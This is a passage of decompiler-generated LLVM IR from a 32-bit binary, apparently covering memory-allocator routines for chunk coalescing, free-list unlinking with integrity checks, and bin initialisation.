dec_label_pc_8051237:                             ; preds = %dec_label_pc_8051209
  %v1_805123c = call i32 @function_805236d(i32 0)
  store i32 %v1_805123c, i32* %edi.global-to-local, align 4
  %v0_8051243 = load i32, i32* @esi, align 4
  store i32 %v0_8051243, i32* %eax.global-to-local, align 4
  %v1_8051245 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051245 = add i32 %v1_8051245, 44
  %v3_8051245 = inttoptr i32 %v2_8051245 to i32*
  %v4_8051245 = load i32, i32* %v3_8051245, align 4
  %v5_8051245 = add i32 %v4_8051245, %v0_8051243
  store i32 %v5_8051245, i32* %eax.global-to-local, align 4
  %v12_805124b = icmp eq i32 %v1_805123c, %v5_8051245
  %v1_805124d = icmp eq i1 %v12_805124b, false
  br i1 %v1_805124d, label %dec_label_pc_805128e, label %dec_label_pc_805124f

dec_label_pc_805124f:                             ; preds = %dec_label_pc_8051237
  %v1_8051252 = sub i32 0, %v4_8051230
  store i32 %v1_8051252, i32* @ebx, align 4
  %v1_8051255 = call i32 @function_805236d(i32 %v1_8051252)
  store i32 %v1_8051255, i32* %eax.global-to-local, align 4
  %v1_8051261 = call i32 @function_805236d(i32 0)
  store i32 %v1_8051261, i32* %eax.global-to-local, align 4
  %v10_8051269 = icmp eq i32 %v1_8051261, -1
  br i1 %v10_8051269, label %dec_label_pc_805128e, label %dec_label_pc_805126e

dec_label_pc_805126e:                             ; preds = %dec_label_pc_805124f
  %v0_805126e = load i32, i32* %edi.global-to-local, align 4
  %v2_8051270 = sub i32 %v0_805126e, %v1_8051261
  %v12_8051270 = icmp eq i32 %v2_8051270, 0
  store i32 %v2_8051270, i32* %ecx.global-to-local, align 4
  br i1 %v12_8051270, label %dec_label_pc_805128e, label %dec_label_pc_8051274

dec_label_pc_8051274:                             ; preds = %dec_label_pc_805126e
  %v0_8051274 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051274 = add i32 %v0_8051274, 44
  %v2_8051274 = inttoptr i32 %v1_8051274 to i32*
  %v3_8051274 = load i32, i32* %v2_8051274, align 4
  store i32 %v3_8051274, i32* %eax.global-to-local, align 4
  %v1_8051277 = add i32 %v0_8051274, 872
  %v2_8051277 = inttoptr i32 %v1_8051277 to i32*
  %v3_8051277 = load i32, i32* %v2_8051277, align 4
  %v5_8051277 = sub i32 %v3_8051277, %v2_8051270
  store i32 %v5_8051277, i32* %v2_8051277, align 4
  %v0_805127d = load i32, i32* @esi, align 4
  %v1_805127d = load i32, i32* %ecx.global-to-local, align 4
  %v2_805127d = sub i32 %v0_805127d, %v1_805127d
  %v1_805127f = or i32 %v2_805127d, 1
  %v1_8051282 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051282 = add i32 %v1_8051282, 4
  %v3_8051282 = inttoptr i32 %v2_8051282 to i32*
  store i32 %v1_805127f, i32* %v3_8051282, align 4
  br label %dec_label_pc_805128e

dec_label_pc_805128e:                             ; preds = %dec_label_pc_8051209, %dec_label_pc_8051237, %dec_label_pc_805124f, %dec_label_pc_805126e, %dec_label_pc_8051274
  %storemerge = phi i32 [ 1, %dec_label_pc_8051274 ], [ 0, %dec_label_pc_805126e ], [ 0, %dec_label_pc_805124f ], [ 0, %dec_label_pc_8051237 ], [ 0, %dec_label_pc_8051209 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8051261, { 1, 0, 2 }
  uselistorder i32 %v4_8051230, { 1, 2, 0 }
  uselistorder i32 %v3_8051212, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_805236d, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_805128e, { 4, 3, 2, 1, 0 }
}

define i32 @function_8051296(i32* %arg1) local_unnamed_addr {
dec_label_pc_8051296:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8051297 = load i32, i32* @edi, align 4
  %v0_8051298 = load i32, i32* @esi, align 4
  %v0_8051299 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80512a1 = load i32, i32* %arg1, align 4
  store i32 %v2_80512a1, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80512a8 = icmp eq i32 %v2_80512a1, 0
  br i1 %v1_80512a8, label %dec_label_pc_80513c2.lr.ph, label %dec_label_pc_80512b0

dec_label_pc_80513c2.lr.ph:                       ; preds = %dec_label_pc_8051296
  %v3_80513c6 = add i32 %tmp20, 44
  br label %dec_label_pc_80513c2

dec_label_pc_80512b0:                             ; preds = %dec_label_pc_8051296
  %v1_80512b4 = and i32 %v2_80512a1, -3
  store i32 %v1_80512b4, i32* %arg1, align 4
  %v1_80512b9 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_80512c4 = add i32 %tmp20, 4
  store i32 %v1_80512c4, i32* %eax.global-to-local, align 4
  %v2_80512cf = load i32, i32* %arg1, align 4
  %v2_80512d5 = udiv i32 %v2_80512cf, 8
  %v2_80512d8 = mul nuw i32 %v2_80512d5, 4
  %v3_80512d8 = add i32 %tmp20, -4
  %v4_80512d8 = add i32 %v3_80512d8, %v2_80512d8
  store i32 %v4_80512d8, i32* %eax.global-to-local, align 4
  %v2_805139f = add i32 %tmp20, 44
  %v3_805139f = inttoptr i32 %v2_805139f to i32*
  %v1_8051372 = add i32 %tmp20, 60
  %v2_8051372 = inttoptr i32 %v1_8051372 to i32*
  br label %dec_label_pc_80512e0

dec_label_pc_80512e0:                             ; preds = %dec_label_pc_80513ae, %dec_label_pc_80512b0
  %v0_80512ee = phi i32 [ %v1_80512c4, %dec_label_pc_80512b0 ], [ %v4_80513b8, %dec_label_pc_80513ae ]
  store i32 %v0_80512ee, i32* %eax.global-to-local, align 4
  %v1_80512e4 = inttoptr i32 %v0_80512ee to i32*
  %v2_80512e4 = load i32, i32* %v1_80512e4, align 4
  store i32 %v2_80512e4, i32* @ecx, align 4
  %v1_80512e6 = icmp eq i32 %v2_80512e4, 0
  br i1 %v1_80512e6, label %dec_label_pc_80513ae, label %dec_label_pc_80512ee

dec_label_pc_80512ee:                             ; preds = %dec_label_pc_80512e0
  store i32 0, i32* %v1_80512e4, align 4
  %v0_80512f4.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80512f4

dec_label_pc_80512f4:                             ; preds = %dec_label_pc_80513a2, %dec_label_pc_80512ee
  %v0_8051311 = phi i32 [ %v3_80512f4, %dec_label_pc_80513a2 ], [ %v0_80512f4.pre, %dec_label_pc_80512ee ]
  %v1_80512f4 = add i32 %v0_8051311, 8
  %v2_80512f4 = inttoptr i32 %v1_80512f4 to i32*
  %v3_80512f4 = load i32, i32* %v2_80512f4, align 4
  store i32 %v3_80512f4, i32* %edx.global-to-local, align 4
  %v1_80512fb = add i32 %v0_8051311, 4
  %v2_80512fb = inttoptr i32 %v1_80512fb to i32*
  %v3_80512fb = load i32, i32* %v2_80512fb, align 4
  store i32 %v3_80512fb, i32* %eax.global-to-local, align 4
  %v1_8051300 = and i32 %v3_80512fb, -2
  store i32 %v1_8051300, i32* @edi, align 4
  %v2_8051303 = urem i32 %v3_80512fb, 2
  %v3_8051303 = icmp eq i32 %v2_8051303, 0
  %v2_8051305 = add i32 %v1_8051300, %v0_8051311
  store i32 %v2_8051305, i32* @ebx, align 4
  %v1_8051308 = add i32 %v2_8051305, 4
  %v2_8051308 = inttoptr i32 %v1_8051308 to i32*
  %v3_8051308 = load i32, i32* %v2_8051308, align 4
  store i32 %v3_8051308, i32* %edx.global-to-local, align 4
  %v1_805130f = icmp eq i1 %v3_8051303, false
  br i1 %v1_805130f, label %dec_label_pc_8051331, label %dec_label_pc_8051311

dec_label_pc_8051311:                             ; preds = %dec_label_pc_80512f4
  %v1_8051311 = inttoptr i32 %v0_8051311 to i32*
  %v2_8051311 = load i32, i32* %v1_8051311, align 4
  store i32 %v2_8051311, i32* %ebp.global-to-local, align 4
  %v2_8051315 = sub i32 %v0_8051311, %v2_8051311
  store i32 %v2_8051315, i32* %eax.global-to-local, align 4
  %v1_8051317 = add i32 %v2_8051315, 8
  %v2_8051317 = inttoptr i32 %v1_8051317 to i32*
  %v3_8051317 = load i32, i32* %v2_8051317, align 4
  store i32 %v3_8051317, i32* @esi, align 4
  %v1_805131a = add i32 %v2_8051315, 12
  %v2_805131a = inttoptr i32 %v1_805131a to i32*
  %v3_805131a = load i32, i32* %v2_805131a, align 4
  store i32 %v3_805131a, i32* %edx.global-to-local, align 4
  %v1_805131d = add i32 %v3_8051317, 12
  %v2_805131d = inttoptr i32 %v1_805131d to i32*
  %v3_805131d = load i32, i32* %v2_805131d, align 4
  store i32 %v3_805131d, i32* @ecx, align 4
  %v12_8051320 = icmp eq i32 %v3_805131d, %v2_8051315
  %v1_8051322 = icmp eq i1 %v12_8051320, false
  br i1 %v1_8051322, label %dec_label_pc_8051361, label %dec_label_pc_8051324

dec_label_pc_8051324:                             ; preds = %dec_label_pc_8051311
  %v1_8051324 = add i32 %v3_805131a, 8
  %v2_8051324 = inttoptr i32 %v1_8051324 to i32*
  %v3_8051324 = load i32, i32* %v2_8051324, align 4
  %v15_8051324 = icmp eq i32 %v3_8051324, %v3_805131d
  %v1_8051327 = icmp eq i1 %v15_8051324, false
  br i1 %v1_8051327, label %dec_label_pc_8051361, label %dec_label_pc_8051329

dec_label_pc_8051329:                             ; preds = %dec_label_pc_8051324
  %v2_8051329 = add i32 %v2_8051311, %v1_8051300
  store i32 %v2_8051329, i32* @edi, align 4
  store i32 %v3_805131a, i32* %v2_805131d, align 4
  %v0_805132e = load i32, i32* @esi, align 4
  %v1_805132e = load i32, i32* %edx.global-to-local, align 4
  %v2_805132e = add i32 %v1_805132e, 8
  %v3_805132e = inttoptr i32 %v2_805132e to i32*
  store i32 %v0_805132e, i32* %v3_805132e, align 4
  %v0_805133c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051331

dec_label_pc_8051331:                             ; preds = %dec_label_pc_80512f4, %dec_label_pc_8051329
  %v1_8051345 = phi i32 [ %v2_8051305, %dec_label_pc_80512f4 ], [ %v0_805133c.pre, %dec_label_pc_8051329 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8051339 = and i32 %v3_8051308, -4
  store i32 %v1_8051339, i32* %ebp.global-to-local, align 4
  %v4_805133c = load i32, i32* %v3_805139f, align 4
  %v15_805133c = icmp eq i32 %v1_8051345, %v4_805133c
  br i1 %v15_805133c, label %dec_label_pc_8051392, label %dec_label_pc_8051341

dec_label_pc_8051341:                             ; preds = %dec_label_pc_8051331
  %v2_8051341 = add i32 %v1_8051345, 4
  %v3_8051341 = add i32 %v2_8051341, %v1_8051339
  %v4_8051341 = inttoptr i32 %v3_8051341 to i32*
  %v5_8051341 = load i32, i32* %v4_8051341, align 4
  store i32 %v5_8051341, i32* %eax.global-to-local, align 4
  %v3_8051345 = inttoptr i32 %v2_8051341 to i32*
  store i32 %v1_8051339, i32* %v3_8051345, align 4
  %v0_8051348 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051348 = urem i32 %v0_8051348, 2
  %v2_8051348 = icmp eq i32 %v1_8051348, 0
  store i32 %v1_8051348, i32* %eax.global-to-local, align 4
  %v1_805134d = icmp eq i1 %v2_8051348, false
  br i1 %v1_805134d, label %dec_label_pc_805136e, label %dec_label_pc_805134f

dec_label_pc_805134f:                             ; preds = %dec_label_pc_8051341
  %v0_805134f = load i32, i32* @ebx, align 4
  %v1_805134f = add i32 %v0_805134f, 8
  %v2_805134f = inttoptr i32 %v1_805134f to i32*
  %v3_805134f = load i32, i32* %v2_805134f, align 4
  store i32 %v3_805134f, i32* @edx, align 4
  %v1_8051352 = add i32 %v0_805134f, 12
  %v2_8051352 = inttoptr i32 %v1_8051352 to i32*
  %v3_8051352 = load i32, i32* %v2_8051352, align 4
  store i32 %v3_8051352, i32* %eax.global-to-local, align 4
  %v1_8051355 = add i32 %v3_805134f, 12
  %v2_8051355 = inttoptr i32 %v1_8051355 to i32*
  %v3_8051355 = load i32, i32* %v2_8051355, align 4
  store i32 %v3_8051355, i32* @esi, align 4
  %v12_8051358 = icmp eq i32 %v3_8051355, %v0_805134f
  %v1_805135a = icmp eq i1 %v12_8051358, false
  br i1 %v1_805135a, label %dec_label_pc_8051361, label %dec_label_pc_805135c

dec_label_pc_805135c:                             ; preds = %dec_label_pc_805134f
  %v1_805135c = add i32 %v3_8051352, 8
  %v2_805135c = inttoptr i32 %v1_805135c to i32*
  %v3_805135c = load i32, i32* %v2_805135c, align 4
  %v15_805135c = icmp eq i32 %v3_805135c, %v3_8051355
  br i1 %v15_805135c, label %dec_label_pc_8051366, label %dec_label_pc_8051361

dec_label_pc_8051361:                             ; preds = %dec_label_pc_805135c, %dec_label_pc_805134f, %dec_label_pc_8051324, %dec_label_pc_8051311
  %v0_8051361 = call i32 @function_80515da()
  store i32 %v0_8051361, i32* %eax.global-to-local, align 4
  %v1_8051368.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051366

dec_label_pc_8051366:                             ; preds = %dec_label_pc_805135c, %dec_label_pc_8051361
  %v1_8051368 = phi i32 [ %v3_805134f, %dec_label_pc_805135c ], [ %v1_8051368.pre, %dec_label_pc_8051361 ]
  %v0_8051368 = phi i32 [ %v3_8051352, %dec_label_pc_805135c ], [ %v0_8051361, %dec_label_pc_8051361 ]
  %v0_8051366 = load i32, i32* @edi, align 4
  %v1_8051366 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051366 = add i32 %v1_8051366, %v0_8051366
  store i32 %v2_8051366, i32* @edi, align 4
  %v2_8051368 = add i32 %v1_8051368, 12
  %v3_8051368 = inttoptr i32 %v2_8051368 to i32*
  store i32 %v0_8051368, i32* %v3_8051368, align 4
  %v0_805136b = load i32, i32* @edx, align 4
  %v1_805136b = load i32, i32* %eax.global-to-local, align 4
  %v2_805136b = add i32 %v1_805136b, 8
  %v3_805136b = inttoptr i32 %v2_805136b to i32*
  store i32 %v0_805136b, i32* %v3_805136b, align 4
  br label %dec_label_pc_805136e

dec_label_pc_805136e:                             ; preds = %dec_label_pc_8051341, %dec_label_pc_8051366
  store i32 %v1_80512b9, i32* %eax.global-to-local, align 4
  %v3_8051372 = load i32, i32* %v2_8051372, align 4
  store i32 %v3_8051372, i32* @edx, align 4
  %v0_8051375 = load i32, i32* @ecx, align 4
  store i32 %v0_8051375, i32* %v2_8051372, align 4
  %v0_8051378 = load i32, i32* @edi, align 4
  %v1_805137a = or i32 %v0_8051378, 1
  store i32 %v1_805137a, i32* %eax.global-to-local, align 4
  %v0_805137d = load i32, i32* @ecx, align 4
  %v1_805137d = load i32, i32* @edx, align 4
  %v2_805137d = add i32 %v1_805137d, 12
  %v3_805137d = inttoptr i32 %v2_805137d to i32*
  store i32 %v0_805137d, i32* %v3_805137d, align 4
  %v0_8051380 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051380 = load i32, i32* @ecx, align 4
  %v2_8051380 = add i32 %v1_8051380, 4
  %v3_8051380 = inttoptr i32 %v2_8051380 to i32*
  store i32 %v0_8051380, i32* %v3_8051380, align 4
  store i32 %v1_80512b9, i32* %eax.global-to-local, align 4
  %v0_8051387 = load i32, i32* @edx, align 4
  %v1_8051387 = load i32, i32* @ecx, align 4
  %v2_8051387 = add i32 %v1_8051387, 8
  %v3_8051387 = inttoptr i32 %v2_8051387 to i32*
  store i32 %v0_8051387, i32* %v3_8051387, align 4
  %v0_805138a = load i32, i32* %eax.global-to-local, align 4
  %v1_805138a = load i32, i32* @ecx, align 4
  %v2_805138a = add i32 %v1_805138a, 12
  %v3_805138a = inttoptr i32 %v2_805138a to i32*
  store i32 %v0_805138a, i32* %v3_805138a, align 4
  %v0_805138d = load i32, i32* @edi, align 4
  %v1_805138d = load i32, i32* @ecx, align 4
  %v3_805138d = add i32 %v1_805138d, %v0_805138d
  %v4_805138d = inttoptr i32 %v3_805138d to i32*
  store i32 %v0_805138d, i32* %v4_805138d, align 4
  br label %dec_label_pc_80513a2

dec_label_pc_8051392:                             ; preds = %dec_label_pc_8051331
  %v0_8051392 = load i32, i32* @edi, align 4
  %v2_8051392 = add i32 %v0_8051392, %v1_8051339
  %v1_8051395 = or i32 %v2_8051392, 1
  store i32 %v1_8051395, i32* %eax.global-to-local, align 4
  %v1_8051398 = load i32, i32* @ecx, align 4
  %v2_8051398 = add i32 %v1_8051398, 4
  %v3_8051398 = inttoptr i32 %v2_8051398 to i32*
  store i32 %v1_8051395, i32* %v3_8051398, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_805139f = load i32, i32* @ecx, align 4
  store i32 %v0_805139f, i32* %v3_805139f, align 4
  br label %dec_label_pc_80513a2

dec_label_pc_80513a2:                             ; preds = %dec_label_pc_805136e, %dec_label_pc_8051392
  store i32 %v3_80512f4, i32* @ecx, align 4
  %v1_80513a6 = icmp eq i32 %v3_80512f4, 0
  %v1_80513a8 = icmp eq i1 %v1_80513a6, false
  br i1 %v1_80513a8, label %dec_label_pc_80512f4, label %dec_label_pc_80513ae

dec_label_pc_80513ae:                             ; preds = %dec_label_pc_80513a2, %dec_label_pc_80512e0
  %v15_80513b2 = icmp eq i32 %v0_80512ee, %v4_80512d8
  %v4_80513b8 = add i32 %v0_80512ee, 4
  br i1 %v15_80513b2, label %dec_label_pc_8051436, label %dec_label_pc_80512e0

dec_label_pc_80513c2:                             ; preds = %dec_label_pc_80513c2.lr.ph, %dec_label_pc_80513c2
  %v1_80513c6 = phi i32 [ 1, %dec_label_pc_80513c2.lr.ph ], [ %v0_80513d1, %dec_label_pc_80513c2 ]
  %v2_80513c6 = mul i32 %v1_80513c6, 8
  %v4_80513c6 = add i32 %v3_80513c6, %v2_80513c6
  store i32 %v4_80513c6, i32* %eax.global-to-local, align 4
  %v1_80513ca = add i32 %v1_80513c6, 1
  store i32 %v1_80513ca, i32* %edx.global-to-local, align 4
  %v2_80513cb = add i32 %v4_80513c6, 12
  %v3_80513cb = inttoptr i32 %v2_80513cb to i32*
  store i32 %v4_80513c6, i32* %v3_80513cb, align 4
  %v0_80513ce = load i32, i32* %eax.global-to-local, align 4
  %v2_80513ce = add i32 %v0_80513ce, 8
  %v3_80513ce = inttoptr i32 %v2_80513ce to i32*
  store i32 %v0_80513ce, i32* %v3_80513ce, align 4
  %v0_80513d1 = load i32, i32* %edx.global-to-local, align 4
  %v7_80513d4 = icmp sgt i32 %v0_80513d1, 95
  br i1 %v7_80513d4, label %dec_label_pc_80513d6, label %dec_label_pc_80513c2

dec_label_pc_80513d6:                             ; preds = %dec_label_pc_80513c2
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80513da = add i32 %tmp20, 864
  %v2_80513da = inttoptr i32 %v1_80513da to i32*
  %v3_80513da = load i32, i32* %v2_80513da, align 4
  %v4_80513da = or i32 %v3_80513da, 1
  store i32 %v4_80513da, i32* %v2_80513da, align 4
  %v0_80513e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80513e1 = add i32 %v0_80513e1, 840
  %v2_80513e1 = inttoptr i32 %v1_80513e1 to i32*
  store i32 0, i32* %v2_80513e1, align 4
  %v0_80513eb = load i32, i32* %eax.global-to-local, align 4
  %v1_80513eb = add i32 %v0_80513eb, 852
  %v2_80513eb = inttoptr i32 %v1_80513eb to i32*
  store i32 65536, i32* %v2_80513eb, align 4
  %v0_80513f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80513f5 = add i32 %v0_80513f5, 844
  %v2_80513f5 = inttoptr i32 %v1_80513f5 to i32*
  store i32 262144, i32* %v2_80513f5, align 4
  %v0_80513ff = load i32, i32* %eax.global-to-local, align 4
  %v1_80513ff = add i32 %v0_80513ff, 836
  %v2_80513ff = inttoptr i32 %v1_80513ff to i32*
  store i32 262144, i32* %v2_80513ff, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_8051410 = load i32, i32* %arg1, align 4
  %v1_8051412 = urem i32 %v2_8051410, 4
  %v1_8051415 = or i32 %v1_8051412, 72
  store i32 %v1_8051415, i32* %arg1, align 4
  %v0_805141a = load i32, i32* @edx, align 4
  %v1_805141c = add i32 %v0_805141a, 52
  store i32 %v1_805141c, i32* %eax.global-to-local, align 4
  %v2_805141f = add i32 %v0_805141a, 44
  %v3_805141f = inttoptr i32 %v2_805141f to i32*
  store i32 %v1_805141c, i32* %v3_805141f, align 4
  %v1_8051424 = call i32 @function_8051a1e(i32 30)
  store i32 %v1_8051424, i32* %eax.global-to-local, align 4
  %v2_8051430 = add i32 %tmp20, 860
  %v3_8051430 = inttoptr i32 %v2_8051430 to i32*
  store i32 %v1_8051424, i32* %v3_8051430, align 4
  br label %dec_label_pc_8051436

dec_label_pc_8051436:                             ; preds = %dec_label_pc_80513ae, %dec_label_pc_80513d6
  store i32 %v0_8051299, i32* @ebx, align 4
  store i32 %v0_8051298, i32* @esi, align 4
  store i32 %v0_8051297, i32* @edi, align 4
  %v0_805143d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805143d

; uselistorder directives
  uselistorder i32 %v0_80513d1, { 1, 0 }
  uselistorder i32 %v0_80513ce, { 1, 0 }
  uselistorder i32 %v1_80513c6, { 1, 0 }
  uselistorder i32 %v0_805138d, { 1, 0 }
  uselistorder i32 %v1_8051348, { 1, 0 }
  uselistorder i32 %v2_8051341, { 1, 0 }
  uselistorder i32 %v1_8051339, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8051345, { 1, 0 }
  uselistorder i32 %v3_80512f4, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8051311, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80512ee, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805139f, { 1, 0 }
  uselistorder i32 %v1_80512b9, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_8051436, { 1, 0 }
  uselistorder label %dec_label_pc_80513c2, { 1, 0 }
  uselistorder label %dec_label_pc_80513a2, { 1, 0 }
  uselistorder label %dec_label_pc_805136e, { 1, 0 }
  uselistorder label %dec_label_pc_8051366, { 1, 0 }
  uselistorder label %dec_label_pc_8051331, { 1, 0 }
}

define i32 @function_805143e(i32 %arg1) local_unnamed_addr {
dec_label_pc_805143e:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805143e = load i32, i32* @ebp, align 4
  %v0_805143f = load i32, i32* @edi, align 4
  %v0_8051440 = load i32, i32* @esi, align 4
  %v0_8051441 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8051449 = icmp eq i32 %arg1, 0
  br i1 %v1_8051449, label %dec_label_pc_80515d2, label %dec_label_pc_8051451

dec_label_pc_8051451:                             ; preds = %dec_label_pc_805143e
  %v2_805145c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805145c, i32* @eax, align 4
  %v2_8051461 = call i32 @function_8051ba5(i32 %v2_805145c, i32 134552482)
  store i32 %v2_8051461, i32* %eax.global-to-local, align 4
  %v1_805146d = call i32 @function_8051ba2(i32 ptrtoint (i32* @global_var_805303c.31 to i32))
  %v1_8051472 = add i32 %arg1, -8
  store i32 %v1_8051472, i32* @ecx, align 4
  %v0_8051475 = load i8, i8* @global_var_8053340.32, align 1
  %v1_8051475 = sext i8 %v0_8051475 to i32
  store i32 %v1_8051475, i32* %eax.global-to-local, align 4
  %v1_805147d = add i32 %arg1, -4
  %v2_805147d = inttoptr i32 %v1_805147d to i32*
  %v3_805147d = load i32, i32* %v2_805147d, align 4
  %v1_8051482 = and i32 %v3_805147d, -4
  %v4_8051482 = trunc i32 %v1_8051482 to i8
  store i32 %v1_8051482, i32* @ebx, align 4
  %v8_8051487 = icmp ugt i8 %v4_8051482, %v0_8051475
  br i1 %v8_8051487, label %dec_label_pc_80514a9, label %dec_label_pc_8051489

dec_label_pc_8051489:                             ; preds = %dec_label_pc_8051451
  %v2_8051489 = udiv i32 %v3_805147d, 8
  %v1_805148c = or i32 %v1_8051475, 3
  %v3_805148c = trunc i32 %v1_805148c to i8
  store i32 %v1_805148c, i32* %eax.global-to-local, align 4
  store i8 %v3_805148c, i8* @global_var_8053340.32, align 64
  %v1_8051494 = mul nuw i32 %v2_8051489, 4
  %v2_8051494 = add i32 %v1_8051494, ptrtoint (i8* @global_var_8053340.32 to i32)
  store i32 %v2_8051494, i32* @edx, align 4
  %v1_805149b = add i32 %v1_8051494, add (i32 ptrtoint (i8* @global_var_8053340.32 to i32), i32 -4)
  %v2_805149b = inttoptr i32 %v1_805149b to i32*
  %v3_805149b = load i32, i32* %v2_805149b, align 4
  store i32 %v3_805149b, i32* %eax.global-to-local, align 4
  %v3_805149e = inttoptr i32 %arg1 to i32*
  store i32 %v3_805149b, i32* %v3_805149e, align 4
  %v0_80514a1 = load i32, i32* @ecx, align 4
  %v1_80514a1 = load i32, i32* @edx, align 4
  %v2_80514a1 = add i32 %v1_80514a1, -4
  %v3_80514a1 = inttoptr i32 %v2_80514a1 to i32*
  store i32 %v0_80514a1, i32* %v3_80514a1, align 4
  br label %dec_label_pc_80515c1

dec_label_pc_80514a9:                             ; preds = %dec_label_pc_8051451
  %v1_80514a9 = trunc i32 %v3_805147d to i8
  %v2_80514a9 = and i8 %v1_80514a9, 2
  %v3_80514a9 = icmp eq i8 %v2_80514a9, 0
  %v5_80514a9 = zext i8 %v2_80514a9 to i32
  %v7_80514a9 = and i32 %v3_805147d, -256
  %v8_80514a9 = or i32 %v5_80514a9, %v7_80514a9
  store i32 %v8_80514a9, i32* @edx, align 4
  %v1_80514ac = icmp eq i1 %v3_80514a9, false
  br i1 %v1_80514ac, label %dec_label_pc_80515a1, label %dec_label_pc_80514b2

dec_label_pc_80514b2:                             ; preds = %dec_label_pc_80514a9
  %v1_80514b2 = or i32 %v1_8051475, 1
  %v3_80514b2 = trunc i32 %v1_80514b2 to i8
  store i32 %v1_80514b2, i32* %eax.global-to-local, align 4
  %v2_80514b5 = add i32 %v1_8051482, %v1_8051472
  store i32 %v2_80514b5, i32* @esi, align 4
  store i8 %v3_80514b2, i8* @global_var_8053340.32, align 64
  %v1_80514bd = add i32 %v2_80514b5, 4
  %v2_80514bd = inttoptr i32 %v1_80514bd to i32*
  %v3_80514bd = load i32, i32* %v2_80514bd, align 4
  store i32 %v3_80514bd, i32* %eax.global-to-local, align 4
  %v2_80514c4 = inttoptr i32 %v1_805147d to i8*
  %v3_80514c4 = load i8, i8* %v2_80514c4, align 1
  %v4_80514c4 = urem i8 %v3_80514c4, 2
  %v5_80514c4 = icmp eq i8 %v4_80514c4, 0
  %v1_80514c8 = icmp eq i1 %v5_80514c4, false
  br i1 %v1_80514c8, label %dec_label_pc_80514eb, label %dec_label_pc_80514ca

dec_label_pc_80514ca:                             ; preds = %dec_label_pc_80514b2
  %v2_80514ca = inttoptr i32 %v1_8051472 to i32*
  %v3_80514ca = load i32, i32* %v2_80514ca, align 4
  store i32 %v3_80514ca, i32* @ebp, align 4
  %v2_80514cf = sub i32 %v1_8051472, %v3_80514ca
  store i32 %v2_80514cf, i32* %eax.global-to-local, align 4
  %v1_80514d1 = add i32 %v2_80514cf, 8
  %v2_80514d1 = inttoptr i32 %v1_80514d1 to i32*
  %v3_80514d1 = load i32, i32* %v2_80514d1, align 4
  store i32 %v3_80514d1, i32* @edi, align 4
  %v1_80514d4 = add i32 %v2_80514cf, 12
  %v2_80514d4 = inttoptr i32 %v1_80514d4 to i32*
  %v3_80514d4 = load i32, i32* %v2_80514d4, align 4
  store i32 %v3_80514d4, i32* @edx, align 4
  %v1_80514d7 = add i32 %v3_80514d1, 12
  %v2_80514d7 = inttoptr i32 %v1_80514d7 to i32*
  %v3_80514d7 = load i32, i32* %v2_80514d7, align 4
  store i32 %v3_80514d7, i32* @ecx, align 4
  %v12_80514da = icmp eq i32 %v3_80514d7, %v2_80514cf
  %v1_80514dc = icmp eq i1 %v12_80514da, false
  br i1 %v1_80514dc, label %dec_label_pc_805151a, label %dec_label_pc_80514de

dec_label_pc_80514de:                             ; preds = %dec_label_pc_80514ca
  %v1_80514de = add i32 %v3_80514d4, 8
  %v2_80514de = inttoptr i32 %v1_80514de to i32*
  %v3_80514de = load i32, i32* %v2_80514de, align 4
  %v15_80514de = icmp eq i32 %v3_80514de, %v3_80514d7
  %v1_80514e1 = icmp eq i1 %v15_80514de, false
  br i1 %v1_80514e1, label %dec_label_pc_805151a, label %dec_label_pc_80514e3

dec_label_pc_80514e3:                             ; preds = %dec_label_pc_80514de
  %v2_80514e3 = add i32 %v3_80514ca, %v1_8051482
  store i32 %v2_80514e3, i32* @ebx, align 4
  store i32 %v3_80514d4, i32* %v2_80514d7, align 4
  %v0_80514e8 = load i32, i32* @edi, align 4
  %v1_80514e8 = load i32, i32* @edx, align 4
  %v2_80514e8 = add i32 %v1_80514e8, 8
  %v3_80514e8 = inttoptr i32 %v2_80514e8 to i32*
  store i32 %v0_80514e8, i32* %v3_80514e8, align 4
  %v0_80514f2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80514eb

